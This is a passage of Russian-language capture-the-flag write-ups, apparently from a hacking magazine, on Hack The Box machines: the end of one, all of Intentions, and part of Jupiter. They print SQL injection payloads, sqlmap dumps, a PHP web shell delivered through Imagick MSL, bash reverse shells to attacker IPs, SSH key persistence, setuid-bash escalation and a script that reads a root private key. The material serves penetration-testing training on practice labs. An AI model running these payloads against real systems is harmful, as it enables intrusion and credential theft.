                       От вет без ошибки

А теперь попробуем получить какие-нибудь данные. Для этого добавим
к идентификатору запрос select 123 с помощью оператора union. Сервер
вернет вве денную нами последователь ность.





                      Зап рос и ответ сер вера


SQL-èíúåêöèÿ
Первым делом опре деляем, с какой СУБД предсто ит работать. Для этого
достаточно перебрать несколько команд с характерным для раз ных систем
синтаксисом. Сработа ла нагрузка для SQLite.


1 union select sqlite_version()





                         Версия СУБД

Пе реходим к эксфильтра ции таб лиц. Для этого получим их список.


1 union select tbl_name from sqlite_master where type='table' and
tbl_name NOT like 'sqlite_%'





                       Таб лицы в базе SQLite

Находим всего одну таблицу — accounts. Что бы получить из нее данные, нам
нуж ны названия стол бцов. Хорошо, что в SQLite не надо отдель но вытас-
кивать название каждого столбца — можно запросить сра зу всё определение
таблицы.


1 union select sql from sqlite_master where type!='meta' and sql not
NULL and name ='accounts'





                Определение таблицы accounts

В  таблице  два  стол бца:  username  и  password.  Используя  оператор
group_concat, попробуем вывести все логины в одну запись через запятую.


1 union select group_concat(username) from accounts





                  Ошибка получения данных

По лучаем ошиб ку. Что бы избавиться от нее, нужно сменить значение в пер-
вой части зап роса на невоз можное.


-1 union select group_concat(username) from accounts





                   Ло гины в таблице accounts

По лучаем логины поль зователей. Теперь аналогичным запросом получим
данные из стол бца password.


-1 union select group_concat(password) from accounts





                   Па роли в таблице accounts

И теперь у нас есть еще и пароли. С получен ными учетными данными авто-
ризуемся на SSH и забираем первый пользователь ский флаг.





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Те перь нам необходимо собрать информацию. Я буду использовать для это-
го скрип ты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.



Заг рузим на хост скрипт для Linux, дадим пра во на выполнение и запустим
сканиро вание. Информации на выходе получаем мно го, но из полезного я
при метил только то, что открыт харак терный для веб-сер вера порт 8000.





                        От кры тые порты

Что бы   получить  доступ   к  приложению,  нужно   будет  прокинуть
порт 8000 на свой хост с помощью SSH.


ssh sau@pc.htb -L 8000:127.0.0.1:8000

Таким образом весь тра фик, который мы пош лем на локальный порт 8000,
будет  тун нелирован  на  порт  8000  ука занного  хос та  (в  данном  слу-
чае 127.0.0.1) через SSH-хост. Ког да туннель пос троен, можно обратить ся
к сайту через браузер.





                 Главная страница сай та на пор те 8000

Пе ред нами  pyLoad. Это бесплатный менеджер  загрузок  с  откры тым
исходным кодом на Python. Пер вым делом стоит поискать свежие уязвимости
для него. И поиск выводит нас на CVE-2023-0297.





                     Описание уязвимос ти

Затронутые вер сии это го пакета уязвимы перед инъ екци ей команд ОС, так
как приложе ние передает данные из пользователь ско го ввода в pyimport.
А поиск эксплоитов на GitHub приводит к репози торию, где описан PoC
для получе ния RCE.





              Инс трукция для экс плу ата ции уязвимости

По меняем запрос на нуж ный нам, а вместо того, чтобы создавать файл
с помощью touch, попробуем назначить S-бит программе /bin/bash.


curl -i -s -k -XPOST --data-binary 'jk=pyimport%20os;os.system(
"chmod%20u%2bs%20/bin/bash");f=function%20f2(){};&package=xxx&
crypted=AAAA&&passwords=aaaa' 'http://127.0.0.1:8000/flash/
addcrypted2'





                       Зап рос с нагрузкой

Затем проверя ем права на файл командной оболочки /bin/bash и обна-
руживаем, что S-бит выставлен, а значит, у нас вышло проэксплуатировать
уязвимость и получить рут.




                     Права на файл /bin/bash




Когда у файла установлен атрибут setuid (S-атрибут), обычный поль зователь,
запускающий этот файл, получает повышение прав до пользователя — вла-
дельца файла в рам ках запущенного процес са. Пос ле получения повышенных
прав при ложе ние может выполнять задачи, которые недоступны обычному
поль зовате лю. Из-за воз можнос ти сос тояния гонки многие операци онные
системы игнориру ют S-атрибут, уста новленный shell-скриптам.



/bin/bash -p





                           Флаг рута

Машина захвачена!
ВЗЛОМ





      ЭКСПЛУАТИРУЕМ СЛОЖНУЮ
      SQL-ИНЪЕКЦИЮ ДЛЯ ДАМПА
           БАЗЫ ДАННЫХ




Сегодня нам с тобой предстоит пройти
через череду очень сложных веб-уязвимос-
тей,  про эксплуати ровав  двухсту пенчатую
SQL-инъекцию и уязвимость в модуле PHP
Imagick.  Для  продвижения  изу чим  Git-             RalfHacker                                                                                             hackerralf8@gmail.com
репозиторий, а для повыше ния при вилегий
напишем  читалку  файлов  через  поль-
зовательский ска нер.


А поможет нам в этом тренировоч ная машина Intentions с площадки Hack
The Box сложного уровня (hard).




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.220    intentions.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

По результатам ска нирования име ем все го два откры тых порта: 22 — служба
OpenSSH 8.9p1 и 80 — веб-сервер Nginx 1.18.0. Бру тить SSH на машинах
с HTB не принято, а на сай те нас встречает форма авторизации и регис тра-
ции.





                       Страница авто ризации


ÒÎ×ÊÀ ÂÕÎÄÀ
Ре гистрируем нового пользователя и авторизу емся на сайте.





            Главная стра ница авто ризо ванного пользователя

На странице профиля пользователя находим поле, на которое мы можем воз-
дей ствовать.





                  Страница про филя поль зователя

Заг лянув в Burp History (а все действия я рекомендую про водить через
Burp), обна ружим, что используется API.





                      История зап росов

В поле изме нения жанра я попробовал вставить нагрузку ' -- - для SQL-
инъекции и в ответе получил те же данные, толь ко без пробелов.





                        Зап рос на сервер





                        Ответ сервера

Стоит отме тить, что наг рузку мы отправляем к API /api/v1/gallery/user/
genres, а про веряем измененные данные через API /api/v1/auth/user.


ÒÎ×ÊÀ ÎÏÎÐÛ
Burp Macro
Первым делом я решил перебрать раз ные наг рузки с помощью Burp
Intruder. Но сложность в том, что нуж но выполнять два запроса — один
с наг рузкой, а другой для про верки результата. Тут нам могут помочь мак-
росы, которые задаются через настрой ки Burp. Переходим к списку пра вил
сессии и создаем новое.





                     Список правил сес сий

В открыв шемся окне в поле Rule actions соз даем новый макрос run post-
request macro — то есть выполняемый после основного запроса.





                       Настройки правила

Для созданно го макроса открываем Editor и выбираем запрос к API: /api/v1/
auth/user. Здесь мы получаем текущее значение настроек профиля.





                       Настройки макроса

Под тверждаем — и в окне с настройками созданного правила видим наш
макрос.





                       Настройки правила

Пе реходим на вклад ку Scope и в парамет ре URL scope выбираем Include all
URLs, что бы правило при менялось абсолют но ко всем запросам.





                       Настройки правила

Под тверждаем  установленные параметры и видим  созданное пра вило
в общем списке правил.





                     Список правил сес сий

Те перь переносим зап рос  к API /api/v1/gallery/user/genres в Burp
Intruder. В настройках переходим к опции Grep → Extract и ука зываем инте-
ресующее нас поле, что бы добавить его содержимое в общую таб лицу
результатов Intruder.





                    Burp Intruder — вкладка Positions





                    Burp Intruder — вкладка Settings

Так как мы исполь зуем пра вило с несколькими запросами, переби рать нужно
в один поток.





                       Результат перебора

Прос мотрев результат, я ничего необычного не нашел, кро ме того, что мы
получаем ошиб ку  при  отправке сим вола  ".  Таким  образом,  как бы
ни менялось поле жанра, ничего интересного мы не добиваемся.
  Нем ного побродив по сай ту, замеча ем, что жанр также используется
при просмотре галереи. Там выполняет ся вызов API /api/v1/gallery/user/
feed.





                       Зап рос в Burp History

Мы получаем разные изображения в зависимос ти от установ ленного у нас
жанра. Этот момент тоже необходимо про тес тировать, поэтому воз вращаем-
ся к нашим правилам и изменяем макрос, что бы он выполнял зап рос к API /
api/v1/gallery/user/feed. Для изменения выбираем Re-record macro
и отмечаем нужный запрос.





                       Настройки макроса




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




                      ЭКСПЛУАТИРУЕМ СЛОЖНУЮ
          SQL-ИНЪЕКЦИЮ ДЛЯ ДАМПА БАЗЫ ДАННЫХ





                          Macro Recorder

Пос ле изменения мак роса переводим запрос в Burp Repeater и отправляем
обычную нагрузку с коммента рием для Boolean-based-инъекции test' or
1=1 -- -.





                        Зап рос на сервер





                        Ответ сервера

В ответ получаем ошиб ку — видимо, из-за кавычки. Тогда пробуем указать
наг рузку без кавычки.





                        Зап рос на сервер





                        Ответ сервера

Зап рос обработан, но данные никакие не получаем. Переходим к перебору
наг рузок.


SQL-èíúåêöèÿ
Настра иваем Burp Intruder в один поток, только в этот раз ничего извле кать
из отве та не будем, а просто отсорти руем резуль тат по раз меру отве та.





                    Burp Intruder — вкладка Positions





                        Результат ата ки

И получаем несколько нагрузок, дающих иной результат. Значит, SQL-инъ-
екция воз можна, так что переходим к экс плуата ции. Сохраним в виде фай лов
запросы для записи нагрузки и для проверки результата, после чего переда-
дим оба фай ла в sqlmap, что бы авто матизиро вать экс плуатацию. Не забыва-
ем активировать шаб лон space2comment для обхо да фильтра про белов.


sqlmap -r r1.req --second-req r2.req --level= 5 --risk= 3 --tamper=
space2comment --batch




                  Резуль тат сканирования sqlmap

Спустя некоторое вре мя sqlmap опре деляет и кеширует рабочую нагрузку.
Теперь мы можем перейти к получению данных. Сначала выведем список баз
данных (параметр --dbs).


sqlmap -r r1.req --second-req r2.req --level= 5 --risk= 3 --tamper=
space2comment --batch --dbs





                    Существующие базы данных

Нас интересует база intentions, получим из нее (параметр -D) все таблицы
(параметр --tables).


sqlmap -r r1.req --second-req r2.req --level= 5 --risk= 3 --tamper=
space2comment --batch -D intentions --tables





                      Таблицы в базе intentions

Име ем четыре таблицы. В охо те за учет ными дан ными получим все колонки
(параметр --columns) таблицы users (параметр -T).


sqlmap -r r1.req --second-req r2.req --level= 5 --risk= 3 --tamper=
space2comment --batch -D intentions -T users --columns





                     Ко лонки в таб лице users

Нам нуж ны данные (параметр --dump) из колонок email и password, а также
admin (параметр -C), чтобы понимать, кто из пользователей сайта привиле-
гированный.


sqlmap -r r1.req --second-req r2.req --level= 5 --risk= 3 --tamper=
space2comment --batch -D intentions -T users -C email,password,admin
--dump





                    Данные из таблицы users

И спустя примерно час получаем учетные данные всех пользовате лей сайта.


Ïîâûøåíèå ïðèâèëåãèé
Ис поль зован алго ритм хеширования bcrypt, хеши которого мож но перебрать
при помощи hashcat вот такой командой:


hashcat -m 3200 -a 0 --username hashes.txt rockyou.txt

По дождав десять минут и не получив результата, я остановил брут. Видимо,
такой век тор не пред полагался автором машины (все хеши на машинах
с  Hack  The  Box  перебирают ся  не  дольше  пяти  минут  по  словарю
rockyou.txt).
  Я вер нулся на веб-сервер и решил перебрать файлы. Так как уже видели
несколько файлов JavaScript в каталоге /js, будем перебирать с этим рас-
ширением. Я вос поль зуюсь для это го feroxbuster .




Одно из пер вых действий при тес тировании безопасности веб-приложе-
ния — это сканиро вание методом перебо ра каталогов, чтобы найти скры тую
информацию и недоступные обыч ным посети телям функции. Для этого можно
использовать программы вроде dirsearch, DIRB или ﬀuf. Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -w — словарь (я использую сло вари из набора SecLists);
 • -t — количество потоков;
 • -d — глу бина сканирования;
 • -x — расширение файлов;
 • -s — код ответа.



Запускаем сканиро вание:


feroxbuster -u http://intentions.htb/js/ -t 256 -d 1 -w directory_2.
3_medium_lowercase.txt -x js -s 200




         Ре зультат ска нирования файлов с помощью feroxbuster

Об наруживаем файл с говоря щим названи ем admin.js. Файл боль шой, и при
попытке найти слова, содер жащие стро ку pass, натыкаемся на интересные
сообщения.





                  Со держимое файла admin.js

В сообщении сказано, что адми нистратор может использовать API v2 и авто-
ризовать ся по хешу, а не по паролю. Отправляем из Burp History запрос к API
login в Burp Repeater и изменяем версию API с v1 на v2.





                   Зап рос к API /api/v2/auth/login

Нам сообщают, что необходимо предоставить параметры email и hash.
Исполь зуем учетные данные пользователя greg и получаем сообщение
об успешной авторизации.





                   Зап рос к API /api/v2/auth/login

При меним сессию к бра узе ру и прос мотрим дос тупные страницы.





                   Главная стра ница адми нис тратора

Из сооб щения «v2 API Update» делаем вывод, что используется класс PHP
Imagick. Я сразу просмотрел, нет ли в нашей вер сии известных уязвимос тей,
и поиски привели меня к прошлогоднему ба гу, найденному командой PT
Swarm.





                  По иск уязвимос тей в Google


PHP Imagick RCE
В статье отмечено наличие SSRF в конс трукторе клас са Imagick, но, помимо
этого, исполь зовав MSL (Magick Scripting Language), можно развить уяз-
вимость до RCE. Это встроенный язык ImageMagick, который облегчает обра-
бот ку изображений. С его помощью можно в чис ле прочего вза имодей ство-
вать с файловой системой. Это интересно, учи тывая, что на нашем сайте есть
воз можность редактировать изображения.





                         Стра ница Images

Пробуем изме нить оттенок, пос ле чего прос матриваем запрос в Burp History.





               Зап рос к API /api/v2/admin/image/modify

В зап росе передается оттенок и путь к файлу картинки. Используя этот зап-
рос и метод из статьи, поп робуем передать файл MSL, указывающий на изоб-
ражение с веб-шеллом, расположенное на нашем веб-сервере, а потом поп-
робуем обратиться к такому изображению.
  Первым делом соз дадим изоб ражение с веб-шеллом.


convert xc:red -set 'Copyright' '<?php system($_GET["a"]); ?>' expl.
png

Пе редавать будем вот таким фай лом MSL.


<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="http://10.10.14.42/expl.png" />
<write filename="/var/www/html/intentions/public/expl.php" />
</image>




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




                      ЭКСПЛУАТИРУЕМ СЛОЖНУЮ
          SQL-ИНЪЕКЦИЮ ДЛЯ ДАМПА БАЗЫ ДАННЫХ




А теперь нам нуж но одновременно запустить два запроса в Burp Intruder.
В первом мы будем переда вать файл MSL, а во вто ром — пытаться успеть
к нему обратиться, пока он не исчез из временного катало га /tmp.





                      Зап рос с файлом MSL





                    Запрос к вре менному фай лу

Для обоих интрудеров устанавливаем 100–1000 нагрузок с пус той нагрузкой.





                    Burp Intruder — вкладка Payloads

Пос ле запуска обо их интрудеров в логах веб-сер вера видим обращение
к изоб ражению с нагрузкой.





                      Ло ги веб-сервера

Содер жимое картинки с нагрузкой было получе но и сохранено на сервере
в файл PHP. Про буем выполнить команду id.


http://intentions.htb/expl.php?a=id





                 Результат выполнения команды id

Ко ман ды выпол няют ся, а зна чит, запускаем лис тенер pwncat-cs -lp 4321
и выполняем реверс-шелл:


sh -i >& /dev/tcp/10.10.14.42/4321 0>&1





                  Сессия поль зователя www-data


ÏÐÎÄÂÈÆÅÍÈÅ
Так как у нас есть доступ к данным сайта, сто ит пос мотреть, нет ли в исходни-
ках каких-нибудь учетных данных.
  В каталоге сайта находим директорию .git.





           Содер жимое каталога /var/www/html/intentions

Скачав весь репозиторий, мы получим не только текущие файлы, но и исто-
рию их изме нения. При разработ ке для удобства очень часто используются
ста тические учет ные данные. Поэто му архи вируем этот каталог и скачиваем
архив с сайта.


tar -cf ./public/arc.tar ./.git/

На локальном хосте разархивиру ем файл и смот рим историю коммитов
с помощью VS Code.





                      Ис тория ком митов

По оче редно просматривая исто рию изме нений, видим удаленную строку
с учетными данными.





                   История изменения файла

С най денными учетными данными получается авторизоваться по SSH.





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
Выпол няем команду id и узна ём, что наш поль зователь числится в группе
scanner. Сразу поищем файлы, при надлежащие этой группе.


find / -group scanner -type f 2>/dev/null




                    Фай лы группы scanner

Наш ли один исполняемый файл, который мы не можем получить для изу-
чения, но можем выпол нить.





                  Информация о файле scanner

Скорее все го, он поможет нам в повышении привилегий, но как именно —
пока неясно. Поэто му перей дем к стандартному шагу — автоматическому
сканиро ванию системы с помощью PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.



Заг рузим на хост скрипт для Linux, дадим пра во на выполнение и запустим
сканиро вание. В выводе LinPEAS обра щаем внимание на Linux capabilities.




                                Linux capabilities




В Linux пользователь root получа ет особый контекст при запуске любых про-
цессов. Так, ядро и приложения, работающие от име ни root, обычно пропус-
кают любые ограниче ния, заданные на действия в опре деленном контексте,
поэтому root может делать все, что захочет. Но что, если процессу, который
работа ет в неп ривиле гированном контексте, нужно выпол нить требующее
при виле гий действие, не повышая уровня прав?
  Нап ример, бывает нужно разрешить процессу записы вать в журнал аудита
ядра, но не позволять отклю чить этот аудит. Ведь если запус тить этот про-
цесс в контексте рута, он смо жет выпол нить оба действия!
   Тут на помощь и приходят Linux capabilities. Эти «возможности» предос-
тавляют процессу не все мно жество привилегий, а какое-то его подмножес-
тво. Другими словами, все привилегии рута разбиваются на более мелкие
незави симые друг от друга привилегии и процесс получает только  те,
которые ему нужны.


Ис полняемый   файл    /opt/scanner/scanner   име ет   при вилегию
cap_dac_read_search, которая поз воля ет про читать любой файл в системе.
Видимо, дос туп  к фай лам пользователя root — это и есть наш путь
для повыше ния привилегий.
   Изучив справ ку это го сканера, находим интересную воз можность при-
ложения: если мы укажем файл для чтения, количес тво символов и хеш, то
программа прочитает из файла ука занное количество символов, вычислит
хеш MD5 и сравнит с переданным ей вариантом, после чего выдаст результат
сравнения.
   Так мы можем поочередно переб рать все символы в файле и получить его
пол ное содержимое. Про читаем пер вый сим вол из файла и сравним хеш,
который вернет при ложе ние, с хешами всех символов поочередно. Когда
хеши равны, мож но сказать, что мы нашли первый символ. Зная первый, мы
можем переб рать таким же образом второй символ и так далее все содер-
жимое файла.


echo -n t | md5sum


echo test > /home/greg/file.test
/opt/scanner/scanner -c /home/greg/file.test -l 1 -s
e358efa489f58062f10dd7316b65649e -p





                       Про верка теории

Первым делом нужно определить, какой файл читать. Переда ем сканеру путь
к приватному ключу SSH пользователя root и узнаём, что такой файл сущес-
твует.



                   Ре зультат работы программы

Я реализовал наш сценарий рас шифровки в виде простенького скрипта
на Python и получил приват ный ключ.


import hashlib
import os
import string


content = ""
length = 1
while True:
   cmd = f"/opt/scanner/scanner -c /root/.ssh/id_rsa -l {length} -s
111 -p"
   hash = os.popen(cmd).read().split(" ")[-1].rstrip()


   char = None
   for c in string.printable:
       if hash == hashlib.md5((content + c).encode()).hexdigest():
           char = c
           break


   if char:
       print(char, end="")
       content += char
       length += 1
   else:
       break





                  Приватный ключ пользовате ля

Сохраняем ключ в файл, коман дой chmod 0600 id_rsa назначаем нужные
права и подключаем ся по SSH от имени рута.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





     ВЫПОЛНЯЕМ ПРОИЗВОЛЬНЫЙ
      КОД С ПОМОЩЬЮ JUPYTER
           И SATTRACK




В этой статье мы получим доступ к веб-сер-
веру через RCE-уяз вимость и эксплуата цию
SQL-инъекции в PostgreSQL. Затем вос-
пользуем ся    фреймворком     Jupyter
для  выполнения  про изволь ного   кода             RalfHacker                                                                                             hackerralf8@gmail.com
и повысим привилегии в SatTrack.


Наша цель — зах ват прав суперпользователя на тре нировочной машине
Jupiter с пло щадки Hack The Box. Уровень ее сложности — средний.




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ
Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.216 jupiter.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел два открытых порта:
 • порт 22 — служба OpenSSH 8.9p1;
 • порт 80 — веб-сервер Nginx 1.18.0.

При таком выборе начинать нужно с изу чения сай та.





                        Главная стра ница сай та


ÒÎ×ÊÀ ÂÕÎÄÀ
На самом сайте ничего интерес ного не находим, поэтому попробу ем поис-
кать поддомены.




Одно из пер вых действий при тес тировании безопасности веб-приложе-
ния — это сканиро вание методом перебо ра каталогов, чтобы найти скры тую
информацию и недоступные обыч ным посети телям функции. Для этого можно
использовать программы вроде dirsearch и DIRB.
  Я предпочитаю лег кий и очень быс трый ﬀuf. При запус ке указываем сле-
дующие парамет ры:
 • -w — словарь (я использую сло вари из набора SecLists);
 • -t — количество потоков;
 • -u — URL;
 • -H — HTTP-заголо вок.

Место перебора помеча ется сло вом FUZZ.



Запускаем сканиро вание, перечислив все нужные парамет ры:


ffuf -u http://jupiter.htb -w subdomains-top1million-110000.txt -t
256 -H 'Host: FUZZ.jupiter.htb'





                Ре зультат ска ниро вания под доменов

В вывод попадают абсо лютно все вари анты из списка, а значит, будем
использовать  фильтр  -fs,  чтобы  убрать  из  вывода  страницы  раз-
мером 178 байт.


ffuf -u http://jupiter.htb -w subdomains-top1million-110000.txt -t
256 -H 'Host: FUZZ.jupiter.htb' -fs 178





                Ре зультат ска ниро вания под доменов

Находим новый под домен kiosk, который добавляем в файл /etc/hosts.
Обновив файл, просматриваем сайт.


10.10.11.216 jupiter.htb kiosk.jupiter.htb





                 Главная стра ница сайта kiosk.jupiter.htb

Все дей ствия я произво жу через Burp, поэтому, проверив Burp History, сразу
обратил вни мание на то, что используется API и в параметре rawSql переда-
ется следующий SQL-запрос:


select count(parent) from moons where parent = 'Saturn';





                       Зап рос в Burp History

Это явная точка входа, поп робуем воспользовать ся ей.


ÒÎ×ÊÀ ÎÏÎÐÛ
С точки зре ния пентестера, Postgres хорош тем, что может дать выполнение
команд в кон тексте пользователя-службы. Механизм простой: создаем таб-
лицу и заполняем ее выводом выполненной команды. С помощью Burp
Repeater отправляем SQL-запрос для соз дания таб лицы.


create table cmd_exec(cmd_output text);





                      Зап рос в Burp Repeater

Ни каких ошибок нам не вернули, поэто му запускаем локальный веб-сервер
на осно ве Python и выполняем на него тестовый запрос с удаленного сер-
вера при помощи curl.


copy cmd_exec from program 'curl http://10.10.14.188/test_rce';





                      Зап рос в Burp Repeater





                      Ло ги веб-сервера

По лучается, у нас есть RCE, поэто му запускаем листенер (pwncat-cs -lp
4321) и пробрасываем самый обычный реверс-шелл:


bash -i >& /dev/tcp/10.10.14.188/4321 0>&1

Ко неч ный SQL-запрос будет выглядеть вот так:


copy cmd_exec from program 'bash -c "bash -i >& /dev/tcp/10.10.14.
188/4321 0>&1"';





                  Сессия поль зователя postgresql

По лучаем сессию в контексте пользователя postgresql, но спустя минуту
сессия обрывается.




               Сообщение об унич тожении сес сии

Сколько раз я ни про кидывал реверс-шелл, он всегда почти тут же умирал.
В таком случае нам нужно быс тро закрепиться на хос те.


Ñîõðàíåíèå äîñòóïà
Са мый простой способ сохранить дос туп в Linux — это, конечно же, запись
ключа SSH. Но сначала проверим командную оболоч ку пользователя в файле
/etc/passwd.





                Со держимое файла /etc/passwd

При сутствует командная обо лочка /bin/bash, а зна чит, мы можем авто ризо-
вать ся по SSH. Генери руем пару клю чей и записываем публичный в файл ~/.
ssh/authorized_keys.


ssh-keygen
cat /var/lib/postgresql/.ssh/id_rsa.pub > /var/lib/postgresql/.ssh/
authorized_keys
cat /var/lib/postgresql/.ssh/id_rsa





                       Запись клю ча SSH

А теперь копируем приватный ключ на свой хост, назначаем права (chmod
0600 id_rsa) и подключаемся к серверу.


ssh -i id_rsa_postgres postgres@10.10.11.216




                  Сессия пользователя postgres




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




              ВЫПОЛНЯЕМ ПРОИЗВОЛЬНЫЙ КОД С
                      ПОМОЩЬЮ JUPYTER
                               И SATTRACK





ÏÐÎÄÂÈÆÅÍÈÅ
Ïîëüçîâàòåëü juno
Те перь нам нужно собрать информацию. Я, как обычно, буду использовать
для это го скрипты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.



Заг рузим на хост скрипт для Linux, дадим ему пра во на выполнение и запус-
тим сканирование. В выводе будет мно го информации, поэтому отберем
только значимую.
  В спис ке прослушиваемых портов находим интерес ный веб-порт 8888.





                    Список активных пор тов

В /opt есть каталог solar-flares, принадлежащий пользователю jovian.





                  Содержимое каталога /opt

Файл /dev/shm/network-simulation.yml был недавно изменен, и наш
поль зователь имеет право на запись в этот файл.





      Фай лы с правом на запись, изме ненные в течение пяти минут

Заг лянем в найденный файл. В нем про писан запуск команд python3 -m
http.server 80 и curl -s server.





         Содер жимое файла /dev/shm/network-simulation.yml

Интересно, запускают ся ли они в действитель ности и какой процесс исполь-
зует эти настройки. Попробуем отследить запускаемые процес сы в сис теме
утилитой pspy64. Судя по ее выводу, про цессы и правда запущены поль-
зователем juno. Сам файл с настройками передается утилите shadow.





                   Вывод утилиты pspy64

Так как мы име ем право на запись в этот файл, откроем его и изме ним
исполняемые коман ды на cp /bin/bash /tmp/bash и chmod  u+s  /tmp/
bash.





                    Измененная конфигура ция

Так мы пер вой коман дой соз даем копию файла коман дной оболоч ки /bin/
bash, владельцем которо го при копировании становится juno. Второй коман-
дой мы назначаем нашей копии S-бит. Когда shadow выполнится вновь, пос-
мотрим пра ва файла /tmp/bash.




                     Права фай ла /tmp/bash

Пос коль ку файлу установлен атри бут SUID, любой пользователь, запус тивший
его, получит повышение прав до пользовате ля — владельца файла в рамках
запущенного процесса. В дан ном случае это юзер juno.


/tmp/bash -p





                    Сессия пользователя juno

Так как мы получаем лишь euid, а не полноцен ную сес сию, запишем поль-
зователю тот же самый SSH-ключ и авторизу емся уже по SSH.





                       Флаг пользователя


Ïîëüçîâàòåëü jovian
Те перь у нас есть доступ к проекту solar-flares в каталоге /opt.





              Содержимое катало га /opt/solar-ﬂares

Пе рейдем к порту 8888, где развернуто какое-то веб-приложение. Прокинем
данный порт на свой хост через SSH.


ssh -i id_rsa_postgres juno@10.10.11.216 -L 8888:127.0.0.1:8888

Те перь весь трафик, который мы пошлем на локаль ный порт 8888, будет тун-
нелиро ван на порт 8888 указанного хоста (в данном слу чае 127.0.0.1) через
SSH-хост. Под клю чаемся к порту.





                 Главная страница http://127.0.0.1:8888/

Это система Jupyter, логи которой мы видели в катало ге /opt/solar-flares/
logs/. Для авто ризации нам нужен логин или пароль, попробуем най ти их
в логах.





                         Логи Jupyter

Находим токен в URL страницы. Прос то перей дем по этой ссылке и получим
спи сок файлов Jupyter.





                        Главная панель Jupyter

Jupyter —  это  интерактивный  блокнот,  изначально  раз работанный
для IPython, но теперь ори ентированный на работу со множеством сред
выполнения. Для нас же главное, что он позволяет выпол нять код.
  Вы бираем в меню Jupyter пункт New → Python 3.





               Пе реход к стра нице выполнения входа

Запишем пользовате лю SSH-ключ, для чего сна чала скопируем его и дадим
права для чте ния другим пользователям.


cp ~/.ssh/authorized_keys /tmp/id_rsa.pub
chmod 777 /tmp/id_rsa.pub

А теперь через Jupyter выполним код, копирующий ключ пользователю
jovian, от име ни которого работает Jupyter.


import os; os.system("cat /tmp/id_rsa.pub > /home/jovian/.ssh/
authorized_keys")





                  Выполнение кода в Jupyter

Те перь с при ватным ключом подклю чаем ся по SSH.


ssh -i id_rsa_postgres jovian@10.10.11.216




                   Сессия поль зователя jovian


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ
При изме нении кон текста работы сразу про веряем файл sudoers.


sudo -l




                       Настройки sudoers




Файл /etc/sudoers в Linux содержит спис ки команд, которые разные группы
поль зовате лей могут выполнять от имени администратора системы. Можно
прос мотреть его как напрямую, так и при помощи команды sudo -l.



Как видишь, мы можем запустить команду /usr/local/bin/sattrack от име-
ни поль зователя root без ввода пароля. При попытке запустить это приложе-
ние узна ем, что это некая «система тре кинга спут ников». А если поищем
в нем строку config, то получим путь к фай лу с нас тройками.





                Все строки, содер жащие слово conﬁg

При поиске в Google по сло вам «github tleroot hgt updatePeriod», взятым
из файла, получаем всего одну ссылку на репозиторий — arftracksat. И в этом
репози тории находим пример конфига.

